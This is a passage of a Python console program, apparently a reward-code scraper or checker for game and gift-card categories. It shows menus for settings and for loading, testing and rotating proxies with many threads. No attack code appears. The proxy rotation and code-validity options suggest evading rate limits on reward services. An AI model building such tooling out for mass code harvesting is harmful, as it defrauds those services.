        current_value = self.settings.get(key)
        
        console.print(f"\nCurrent value: {current_value}")
        console.print("Enter new value (or press Enter to keep current): ", style="cyan", end="")
        
        new_value = input().strip()
        
        if not new_value:
            console.print("[+] Value unchanged", style="yellow")
            return
        
        # Convert value based on key
        if key in ['timeout', 'max_threads', 'retry_count']:
            try:
                new_value = int(new_value)
                if new_value < 1:
                    console.print("[!] Value must be positive", style="red")
                    return
            except ValueError:
                console.print("[!] Invalid number", style="red")
                return
        elif key in ['save_invalid', 'auto_save']:
            new_value = new_value.lower() in ['true', '1', 'yes', 'on', 'enabled']
        elif key == 'selected_category':
            valid_categories = ['Minecraft', 'Roblox', 'League of Legends', 'Overwatch', 'Sea of Thieves', 'Game Pass', 'GIFTCARDS', 'All']
            if new_value not in valid_categories:
                console.print(f"[!] Invalid category. Valid options: {', '.join(valid_categories)}", style="red")
                return
        
        self.settings.set(key, new_value)
        console.print(f"[+] {key} updated to: {new_value}", style="green")
        time.sleep(1)
    
    def proxy_menu(self):
        """Display proxy menu and handle user input"""
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
            console.print("║" + " " * 22 + "PROXY MENU" + " " * 26 + "║", style="cyan")
            console.print("╠" + "═"*58 + "╣", style="cyan")
            console.print("║  1. Load Proxies - Add proxies to list                   ║", style="cyan")
            console.print("║  2. View Proxies - Show current proxy list               ║", style="cyan")
            console.print("║  3. Check Proxies - Test proxy connectivity              ║", style="cyan")
            console.print("║  4. Proxy Settings - Configure proxy checking            ║", style="cyan")
            console.print("║  5. Go Back - Return to main menu                        ║", style="cyan")
            console.print("╚" + "═"*58 + "╝", style="cyan")
            
            console.print(f"\nCurrent proxies: {len(self.proxy_manager.proxies)}", style="yellow")
            console.print(f"Working proxies: {len(self.proxy_manager.working_proxies)}", style="green")
            console.print("\nSelect option (1-5): ", style="cyan", end="")
            
            try:
                choice = input().strip()
                
                if choice == '1':
                    self.load_proxies()
                elif choice == '2':
                    self.view_proxies()
                elif choice == '3':
                    self.check_proxies()
                elif choice == '4':
                    self.proxy_settings_menu()
                elif choice == '5':
                    break
                else:
                    console.print("\n[!] Invalid option. Please try again.", style="red")
                    time.sleep(1)
            except KeyboardInterrupt:
                break
    
    def load_proxies(self):
        """Load proxies from file or manual input"""
        console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
        console.print("║" + " " * 20 + "LOAD PROXIES" + " " * 21 + "║", style="cyan")
        console.print("╚" + "═"*58 + "╝", style="cyan")
        console.print("\n1. Load from file")
        console.print("2. Add manually")
        console.print("3. Back")
        console.print("\nSelect option (1-3): ", style="cyan", end="")
        
        choice = input().strip()
        
        if choice == '1':
            root = Tk()
            root.withdraw()
            root.attributes('-topmost', True)
            
            file_path = filedialog.askopenfilename(
                title="Select Proxy File",
                filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
            )
            
            root.destroy()
            
            if file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        new_proxies = [line.strip() for line in f if line.strip()]
                    
                    added = 0
                    for proxy in new_proxies:
                        if self.proxy_manager.add_proxy(proxy):
                            added += 1
                    
                    self.proxy_manager.save_proxies()
                    console.print(f"[+] Added {added} new proxies (total: {len(self.proxy_manager.proxies)})", style="green")
                except Exception as e:
                    console.print(f"[!] Error loading file: {e}", style="red")
        
        elif choice == '2':
            console.print("\nEnter proxies (one per line, empty line to finish):")
            proxies = []
            while True:
                proxy = input().strip()
                if not proxy:
                    break
                proxies.append(proxy)
            
            added = 0
            for proxy in proxies:
                if self.proxy_manager.add_proxy(proxy):
                    added += 1
            
            if added > 0:
                self.proxy_manager.save_proxies()
                console.print(f"[+] Added {added} new proxies (total: {len(self.proxy_manager.proxies)})", style="green")
            else:
                console.print("[!] No new proxies added", style="yellow")
        
        time.sleep(2)
    
    def view_proxies(self):
        """View current proxy list"""
        console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
        console.print("║" + " " * 20 + "VIEW PROXIES" + " " * 21 + "║", style="cyan")
        console.print("╚" + "═"*58 + "╝", style="cyan")
        
        if not self.proxy_manager.proxies:
            console.print("\n[!] No proxies loaded", style="yellow")
        else:
            console.print(f"\nTotal proxies: {len(self.proxy_manager.proxies)}", style="cyan")
            console.print(f"Working proxies: {len(self.proxy_manager.working_proxies)}", style="green")
            
            console.print("\nFirst 10 proxies:")
            for i, proxy in enumerate(self.proxy_manager.proxies[:10], 1):
                status = "✓" if proxy in self.proxy_manager.working_proxies else "✗"
                console.print(f"  {i:2d}. {proxy} [{status}]", style="green" if status == "✓" else "red")
            
            if len(self.proxy_manager.proxies) > 10:
                console.print(f"  ... and {len(self.proxy_manager.proxies) - 10} more", style="yellow")
        
        input("\nPress Enter to continue...")
    
    def check_proxies(self):
        """Check proxy connectivity"""
        if not self.proxy_manager.proxies:
            console.print("\n[!] No proxies to check", style="yellow")
            time.sleep(2)
            return
        
        self.proxy_manager.test_all_proxies()
        input("\nPress Enter to continue...")
    
    def proxy_settings_menu(self):
        """Configure proxy settings"""
        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            console.print("\n" + "╔" + "═"*58 + "╗", style="cyan")
            console.print("║" + " " * 21 + "PROXY SETTINGS" + " " * 22 + "║", style="cyan")
            console.print("╚" + "═"*58 + "╝", style="cyan")
            
            settings = self.proxy_manager.proxy_settings
            console.print(f"\n1. Use Proxies: {'Enabled' if settings['use_proxies'] else 'Disabled'}")
            console.print(f"2. Test Timeout: {settings['timeout']}s")
            console.print(f"3. Test URL: {settings['test_url']}")
            console.print(f"4. Check Threads: {settings['check_threads']}")
            console.print(f"5. Rotate Proxies: {'Enabled' if settings['rotate'] else 'Disabled'}")
            console.print(f"6. Remove Failed: {'Enabled' if settings['remove_failed'] else 'Disabled'}")
            console.print("\n7. Back")
            console.print("\nSelect setting to modify (1-7): ", style="cyan", end="")
            
            try:
                choice = input().strip()
                
                if choice == '1':
                    settings['use_proxies'] = not settings['use_proxies']
                    status = "enabled" if settings['use_proxies'] else "disabled"
                    console.print(f"\n[+] Proxy usage {status} for scraping", style="green")
                    if settings['use_proxies'] and not self.proxy_manager.working_proxies:
                        console.print("[!] Warning: No working proxies available", style="yellow")
                    self.proxy_manager.save_settings()  # Save settings
                
                elif choice == '2':
                    console.print(f"\nCurrent timeout: {settings['timeout']}")
                    console.print("Enter new timeout (seconds): ", style="cyan", end="")
                    try:
                        new_val = int(input().strip())
                        if new_val > 0:
                            settings['timeout'] = new_val
                            console.print("[+] Timeout updated", style="green")
                            self.proxy_manager.save_settings()  # Save settings
                        else:
                            console.print("[!] Timeout must be positive", style="red")
                    except:
                        console.print("[!] Invalid number", style="red")
                
                elif choice == '3':
                    console.print(f"\nCurrent test URL: {settings['test_url']}")
                    console.print("Enter new test URL: ", style="cyan", end="")
                    new_val = input().strip()
                    if new_val:
                        settings['test_url'] = new_val
                        console.print("[+] Test URL updated", style="green")
                        self.proxy_manager.save_settings()  # Save settings
                
                elif choice == '4':
                    console.print(f"\nCurrent check threads: {settings['check_threads']}")
                    console.print("Enter new thread count (1-200): ", style="cyan", end="")
                    try:
                        new_val = int(input().strip())
                        if 1 <= new_val <= 200:
                            settings['check_threads'] = new_val
                            console.print("[+] Check threads updated", style="green")
                            self.proxy_manager.save_settings()  # Save settings
                        else:
                            console.print("[!] Threads must be between 1 and 200", style="red")
                    except:
                        console.print("[!] Invalid number", style="red")
                
                elif choice == '5':
                    settings['rotate'] = not settings['rotate']
                    console.print(f"[+] Proxy rotation {'enabled' if settings['rotate'] else 'disabled'}", style="green")
                    self.proxy_manager.save_settings()  # Save settings
                
                elif choice == '6':
                    settings['remove_failed'] = not settings['remove_failed']
                    console.print(f"[+] Remove failed proxies {'enabled' if settings['remove_failed'] else 'disabled'}", style="green")
                    self.proxy_manager.save_settings()  # Save settings
                
                elif choice == '7':
                    break
                else:
                    console.print("\n[!] Invalid option", style="red")
                
                time.sleep(1)
            except KeyboardInterrupt:
                break
    
    def run(self):
        """Run the application"""
        self.show_main_menu()


def main():
    """Main entry point"""
    try:
        app = RewardsApp()
        app.run()
    except KeyboardInterrupt:
        console.print("\n[+] Goodbye!", style="green")
    except Exception as e:
        console.print(f"\n[!] Fatal error: {e}", style="red")
        input("Press Enter to exit...")


if __name__ == "__main__":
    main()
